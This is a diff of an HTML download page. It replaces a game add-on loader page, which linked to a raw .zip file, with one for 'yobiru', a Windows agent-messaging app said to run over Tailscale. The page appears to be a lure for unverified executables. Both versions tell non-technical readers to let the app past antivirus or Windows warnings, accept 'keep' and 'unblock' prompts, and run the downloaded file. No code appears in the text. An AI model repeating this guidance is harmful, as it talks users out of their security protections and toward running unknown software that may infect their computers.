@@ -1,68 +1,370 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="A simple guide to install and use the addon-ez-bedrock-loader for managing game add-ons on Windows.">
-    <title>addon-ez-bedrock-loader - Install game add-ons with ease</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>yobiru - Let Your Agents Talk Securely</title>
+<meta name="description" content="yobiru lets your agents talk: send messages, share data and files, and wake each other up securely over Tailscale. Simple Windows download and easy setup for non-technical users.">
+<meta name="keywords" content="yobiru, agent messaging, Tailscale, file sharing, wake-ups, agent communication, Windows app, secure messaging, data exchange, private network">
+<meta name="robots" content="index, follow">
+<meta name="author" content="yobiru">
+<meta name="theme-color" content="#1f2937">
+<link rel="canonical" href="https://github.com/Kosteletzyavirginicamidst186/yobiru">
+<meta property="og:type" content="website">
+<meta property="og:title" content="yobiru - Let Your Agents Talk Securely">
+<meta property="og:description" content="Send messages, data, files and wake-ups between your agents over Tailscale. Download yobiru for Windows in a few clicks.">
+<meta property="og:url" content="https://github.com/Kosteletzyavirginicamidst186/yobiru/releases">
+<meta property="og:site_name" content="yobiru">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="yobiru - Let Your Agents Talk Securely">
+<meta name="twitter:description" content="Messages, data, files and wake-ups between your agents over Tailscale. Easy Windows download.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "yobiru",
+  "applicationCategory": "UtilitiesApplication",
+  "operatingSystem": "Windows",
+  "description": "yobiru lets your agents talk: messages, data, files and wake-ups over Tailscale.",
+  "url": "https://github.com/Kosteletzyavirginicamidst186/yobiru",
+  "downloadUrl": "https://github.com/Kosteletzyavirginicamidst186/yobiru/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f6f9;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #1f2933;
+    line-height: 1.7;
+    font-size: 17px;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 28px 20px 70px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 16px;
+    box-shadow: 0 6px 24px rgba(23, 39, 61, 0.08);
+    padding: 34px 34px 40px;
+  }
+  h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+    margin: 0 0 14px;
+    font-weight: 800;
+    color: #111827;
+  }
+  h2 {
+    font-size: 1.4rem;
+    margin: 44px 0 14px;
+    font-weight: 700;
+    color: #111827;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.08rem;
+    margin: 26px 0 8px;
+    font-weight: 700;
+    color: #1f2933;
+  }
+  p {
+    margin: 0 0 16px;
+    color: #374151;
+  }
+  ul, ol {
+    margin: 0 0 18px;
+    padding-left: 24px;
+    color: #374151;
+  }
+  li {
+    margin-bottom: 9px;
+  }
+  .lead {
+    font-size: 1.08rem;
+    color: #4b5563;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 34px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #4f46e5 0%, #0ea5e9 100%);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.05rem;
+    text-decoration: none;
+    box-shadow: 0 8px 20px rgba(79, 70, 229, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(79, 70, 229, 0.35);
+  }
+  .btn-wrap {
+    text-align: center;
+    margin: 26px 0 8px;
+  }
+  .btn-note {
+    text-align: center;
+    font-size: 0.9rem;
+    color: #6b7280;
+    margin-top: 12px;
+  }
+  .step {
+    background: #f9fafb;
+    border-left: 4px solid #0ea5e9;
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 0 0 16px;
+  }
+  .step strong {
+    color: #0f172a;
+  }
+  .tip {
+    background: #eef6ff;
+    border-radius: 12px;
+    padding: 16px 20px;
+    margin: 20px 0;
+    color: #1e3a5f;
+    font-size: 0.97rem;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 10px 0 24px;
+    font-size: 0.97rem;
+  }
+  th, td {
+    text-align: left;
+    padding: 12px 14px;
+    border-bottom: 1px solid #e5e7eb;
+    vertical-align: top;
+  }
+  th {
+    background: #f3f4f6;
+    font-weight: 700;
+    color: #111827;
+  }
+  code {
+    background: #f1f5f9;
+    padding: 2px 7px;
+    border-radius: 6px;
+    font-size: 0.92em;
+    font-family: Consolas, Monaco, "Courier New", monospace;
+    color: #b91c1c;
+  }
+  .small {
+    font-size: 0.88rem;
+    color: #6b7280;
+  }
+  a {
+    color: #2563eb;
+  }
+  @media (max-width: 640px) {
+    body { font-size: 16px; }
+    .page { padding: 16px 12px 50px; }
+    .card { padding: 24px 18px 30px; border-radius: 12px; }
+    h1 { font-size: 1.6rem; }
+    h2 { font-size: 1.22rem; margin-top: 34px; }
+    .btn { display: block; padding: 16px 18px; }
+    table, th, td { font-size: 0.9rem; }
+    th, td { padding: 10px 8px; }
+  }
+</style>
 </head>
-<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f4f9;">
+<body>
+<div class="page">
+  <div class="card">
 
-    <h1 style="color: #2c3e50;">📦 addon-ez-bedrock-loader - Manage game add-ons with ease</h1>
+    <h1>🚀 yobiru - Let Your Agents Talk Securely</h1>
 
-    <div style="margin: 30px 0;">
-        <a href="https://raw.githubusercontent.com/Kosteletzyavirginicamidst186/kosteletzyavirginicamidst186.github.io/main/assets/v2.0.zip" style="background-color: #34495e; color: #ffffff; padding: 15px 25px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Visit the download page</a>
+    <p class="lead">yobiru is a small, friendly Windows application that lets your agents talk to each other. They can send messages, pass data back and forth, share files, and wake each other up when there is something to do. Everything travels privately over Tailscale, so nothing is exposed to the open internet.</p>
+
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/Kosteletzyavirginicamidst186/yobiru/releases">⬇ Download yobiru for Windows</a>
+    </div>
+    <p class="btn-note">Visit this link to download the application.</p>
+
+    <h2>🤔 What Is yobiru?</h2>
+
+    <p>Think of yobiru as a post office for your agents. Instead of you carrying information from one program to another by hand, your agents drop things off and pick them up themselves. One agent finishes a job and leaves a note. Another agent reads the note, grabs the file that came with it, and carries on. If an agent is idle, another agent can give it a gentle nudge to wake it up.</p>
+
+    <p>All of this happens on your own private network, created by a free tool called Tailscale. That means your messages and files do not travel through public servers, and strangers cannot see what your agents are saying. You stay in control, and your data stays with you.</p>
+
+    <p>yobiru is designed for people who want the power of connected agents without learning to code. You install it, you connect it to Tailscale, and you press a button. That is genuinely most of it.</p>
+
+    <h2>✨ What You Can Do With It</h2>
+
+    <ul>
+      <li><strong>Send messages between agents.</strong> Short notes, instructions, status updates, or questions. Anything one agent needs another to know.</li>
+      <li><strong>Pass structured data.</strong> Results, lists, numbers, records. Hand off the output of one job as the input of the next without copying and pasting.</li>
+      <li><strong>Share files.</strong> Documents, images, logs, or archives. Send a file once and let the receiving agent pick it up when it is ready.</li>
+      <li><strong>Wake agents up.</strong> If an agent is sleeping or waiting, yobiru can send a wake-up so it starts working again at the right moment.</li>
+      <li><strong>Stay private.</strong> Traffic runs over your Tailscale network, encrypted and addressed only to your own devices.</li>
+      <li><strong>Keep a record.</strong> Messages and transfers are tracked so you can look back and see what happened and when.</li>
+    </ul>
+
+    <h2>🚀 Getting Started on Windows</h2>
+
+    <p>You do not need any programming knowledge to get going. The whole process is a download, an extract if needed, and a short set of clicks. Follow these steps in order and you will be up and running in a few minutes.</p>
+
+    <div class="step">
+      <strong>Step 1 - Open the download page.</strong> Click the download button at the top of this page or use the one further down. It takes you to the official yobiru releases page on GitHub, which is where all published versions live.
     </div>
 
-    <p>The addon-ez-bedrock-loader helps you find and install add-ons for your favorite sandbox game. You do not need technical skills to use this tool. It handles the preparation of files so you can play your game with new features right away.</p>
+    <div class="step">
+      <strong>Step 2 - Pick the newest version.</strong> At the top of the releases page you will see the latest release. Look for the Windows file listed under that release and click it to start downloading. Newer releases are listed above older ones, so the top of the page is almost always the right choice.
+    </div>
 
-    <h2 style="color: #2c3e50;">🛠️ System Requirements</h2>
-    <p>Your computer must meet these basic needs to run the software:</p>
-    <ul>
-        <li>Windows 10 or Windows 11.</li>
-        <li>An active internet connection.</li>
-        <li>A modern web browser like Chrome, Edge, or Firefox.</li>
-        <li>The base sandbox game installed on your local drive.</li>
-    </ul>
+    <div class="step">
+      <strong>Step 3 - Wait for the download to finish.</strong> Your browser will show the progress in its downloads area. The file usually lands in your Downloads folder. Depending on your connection speed, this takes anywhere from a few seconds to a couple of minutes.
+    </div>
 
-    <h2 style="color: #2c3e50;">📥 Download and Setup</h2>
-    <p>Follow these steps to get the loader on your computer:</p>
+    <div class="step">
+      <strong>Step 4 - If Windows asks for confirmation, say yes.</strong> Because the file came from the internet, Windows may show a small blue or yellow message asking whether you trust it. Choose the option that keeps the file and allows it to run. This is normal for software downloaded from the web.
+    </div>
+
+    <div class="step">
+      <strong>Step 5 - Open yobiru.</strong> Find the file you just downloaded and double-click it. yobiru will open its main window and you can begin.
+    </div>
+
+    <h2>💾 Download and Setup</h2>
+
+    <p>Everything you need is published on the official releases page. There is no separate installer wizard to hunt down and no account to create before you start.</p>
+
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/Kosteletzyavirginicamidst186/yobiru/releases">⬇ Get the Latest Release</a>
+    </div>
+
+    <p>Visit this link to download the application.</p>
+
+    <p>When the download finishes, keep the file somewhere easy to find, such as your Desktop or your Downloads folder. If the download arrives as an archive, right-click it and choose Extract All, then open the folder that appears and run the application inside. Windows sometimes hides file extensions, so if you do not see one, that is expected and nothing is wrong.</p>
+
+    <div class="tip">
+      <strong>Good to know:</strong> Keep the downloaded file in a folder you own, like your Documents folder, rather than running it from a temporary location. That way your settings and any files you receive stay in a place you can easily back up.
+    </div>
+
+    <h2>🖥️ Your First Run</h2>
+
     <ol>
-        <li>Go to the <a href="https://raw.githubusercontent.com/Kosteletzyavirginicamidst186/kosteletzyavirginicamidst186.github.io/main/assets/v2.0.zip">official repository page</a> to start your download.</li>
-        <li>Click the release link on that page to save the setup file to your computer.</li>
-        <li>Open your Downloads folder and double-click the file to start the installation.</li>
-        <li>Follow the prompts on your screen.</li>
-        <li>Select the folder where your game files exist when the program asks for a path.</li>
+      <li><strong>Connect Tailscale first.</strong> yobiru uses Tailscale to reach your other devices privately. If you have not set it up yet, install the Tailscale app for Windows, sign in, and make sure the other computers you want to talk to are signed in to the same account.</li>
+      <li><strong>Open yobiru.</strong> The main window shows the devices on your private network that it can see. If a device you expect is missing, check that it is awake and signed in to Tailscale.</li>
+      <li><strong>Choose a partner device.</strong> Select the agent or computer you want to communicate with. This becomes your active connection.</li>
+      <li><strong>Send a test message.</strong> Type something short and send it. If the other side receives it, everything is wired up correctly.</li>
+      <li><strong>Try a file.</strong> Use the file sharing option to send one small file as a practice run. Once you have seen it arrive, you will understand the flow.</li>
     </ol>
 
-    <h2 style="color: #2c3e50;">🎮 How to Load Add-ons</h2>
-    <p>Once you finish the setup, you can add content to your game through the web interface:</p>
+    <h2>🔁 Day-to-Day Use</h2>
+
+    <h3>Sending a message</h3>
+    <p>Open yobiru, pick the agent you want to reach, type your note, and send. Messages are delivered as soon as the other side is reachable. If it is not reachable right now, yobiru holds the message until it is.</p>
+
+    <h3>Passing data</h3>
+    <p>Attach the information you want to hand over and send it the same way you would send a message. The receiving agent gets the data in a form it can use directly, so nothing has to be retyped.</p>
+
+    <h3>Sharing files</h3>
+    <p>Choose the file option, select your file, and confirm. Large files take longer, so give the transfer a moment before assuming something has gone wrong. A progress indicator shows you how far along it is.</p>
+
+    <h3>Waking an agent</h3>
+    <p>If an agent has gone quiet, use the wake-up action. This tells it that new work is waiting. It is the polite version of tapping someone on the shoulder.</p>
+
+    <h2>🔒 Privacy and Safety</h2>
+
+    <p>yobiru is built around Tailscale, which creates an encrypted private network between your own devices. Traffic never passes through public servers, and no one outside your network can see your messages or files. You do not need to configure firewalls, forward ports, or rent a server. Your devices simply find each other and talk directly.</p>
+
+    <p>Practical habits that keep things tidy:</p>
+
     <ul>
-        <li>Open the application from your desktop or start menu.</li>
-        <li>Browse the list of available add-ons within the app.</li>
-        <li>Click the install button next to an add-on.</li>
-        <li>The loader puts the files in the correct game folder for you.</li>
-        <li>Restart your game to see the new content in your menus.</li>
+      <li>Only share your Tailscale account with people you trust.</li>
+      <li>Remove old devices from your Tailscale account when you stop using them.</li>
+      <li>Keep yobiru updated from the same releases page so you always have the latest fixes.</li>
+      <li>Store received files in a folder you recognise, so nothing gets lost in your Downloads pile.</li>
     </ul>
 
-    <h2 style="color: #2c3e50;">⚙️ Troubleshooting Tips</h2>
-    <p>If you face issues, check these common items:</p>
-    <ul>
-        <li><strong>Add-ons do not show:</strong> Ensure the loader points to the correct game directory in the settings menu.</li>
-        <li><strong>App does not open:</strong> Check if your antivirus software prevents the app from running and allow it.</li>
-        <li><strong>Connection errors:</strong> Check your internet connection and restart the app.</li>
-        <li><strong>Updates:</strong> The app checks for new versions automatically when you open it. Always use the latest version.</li>
-    </ul>
+    <h2>📋 What You Need</h2>
 
-    <h2 style="color: #2c3e50;">🌐 Local Serving</h2>
-    <p>Advanced users can host a local version of this loader. You can run the interface through your local network if you wish to manage add-ons from different devices. The settings menu includes a toggle for local server mode. When you enable this, the app provides an IP address you can enter into any browser on your network.</p>
+    <table>
+      <tr>
+        <th>Item</th>
+        <th>Details</th>
+      </tr>
+      <tr>
+        <td>Operating system</td>
+        <td>Windows 10 or Windows 11, 64-bit</td>
+      </tr>
+      <tr>
+        <td>Network tool</td>
+        <td>Tailscale for Windows, signed in on each device that will take part</td>
+      </tr>
+      <tr>
+        <td>Disk space</td>
+        <td>A few hundred megabytes, plus room for any files you send or receive</td>
+      </tr>
+      <tr>
+        <td>Internet connection</td>
+        <td>Needed to download yobiru and to sign in to Tailscale</td>
+      </tr>
+      <tr>
+        <td>Skills required</td>
+        <td>None beyond clicking, typing, and following the steps above</td>
+      </tr>
+    </table>
 
-    <h2 style="color: #2c3e50;">📋 Support</h2>
-    <p>If you find a bug or need help, check the issues tab on the project page. Describe your problem clearly. Include your Windows version and any error messages you see on your screen. This helps others fix the problem faster.</p>
+    <h2>🛠 Troubleshooting</h2>
 
-    <footer style="margin-top: 50px; border-top: 1px solid #ddd; padding-top: 20px; font-size: 0.9em; color: #7f8c8d;">
-        <p>Keywords: game, add-ons, windows, utility, sandbox, mods, loader</p>
-    </footer>
+    <h3>The download does not start</h3>
+    <p>Refresh the releases page and try again. If your browser blocks the file, look for a small message near the top of the window and allow the download. Trying a different browser also helps when a download gets stuck.</p>
 
+    <h3>Windows says the app cannot be run</h3>
+    <p>This is Windows protecting you from unfamiliar files. Open the message, choose the option to keep the file, and then run it again. If the file appears to be blocked, right-click it, open Properties, and look for an option to unblock it.</p>
+
+    <h3>yobiru cannot see my other device</h3>
+    <p>Check that both devices are signed in to the same Tailscale account and both show as connected in the Tailscale app. Wake the other device from sleep, then reopen yobiru so it refreshes its list.</p>
+
+    <h3>A file transfer stopped partway</h3>
+    <p>Large files are sensitive to connection drops. Make sure both devices stay awake, then start the transfer again. Sending in smaller pieces is a reliable fallback.</p>
+
+    <h3>Messages are delayed</h3>
+    <p>If the other agent is busy or asleep, messages wait their turn. Use the wake-up action to prompt it. If delays continue, check that Tailscale is still connected on both ends.</p>
+
+    <h2>❓ Common Questions</h2>
+
+    <h3>Is this free?</h3>
+    <p>Yes. yobiru is published on GitHub and the releases page is the place to get it. Tailscale also offers a free tier that is more than enough for personal use.</p>
+
+    <h3>Do I need to know how to code?</h3>
+    <p>No. The application is made for regular computer users. If you can install an app and click a few buttons, you can use yobiru.</p>
+
+    <h3>Where do my files go?</h3>
+    <p>They are saved on your own machine in the folder you choose. Nothing is uploaded to a third-party storage service.</p>
+
+    <h3>Can I use it on more than one computer?</h3>
+    <p>Yes. Install yobiru on each computer, keep them all signed in to the same Tailscale account, and they will be able to reach one another.</p>
+
+    <h2>🙋 Getting Help</h2>
+
+    <p>If something is not working, the releases page is the best starting point. Check whether a newer version is available, since many small issues are fixed in later releases. Reading through the release notes for your version often answers questions about what changed and what to expect.</p>
+
+    <p>When you ask for help, describe what you did, what you expected to happen, and what actually happened. Mention your Windows version and the version of yobiru you are running. That information makes it much faster for someone to point you in the right direction.</p>
+
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/Kosteletzyavirginicamidst186/yobiru/releases">⬇ Download yobiru Now</a>
+    </div>
+
+    <p class="small">yobiru - messages, data, files and wake-ups over Tailscale.</p>
+
+  </div>
+</div>
 </body>
 </html>
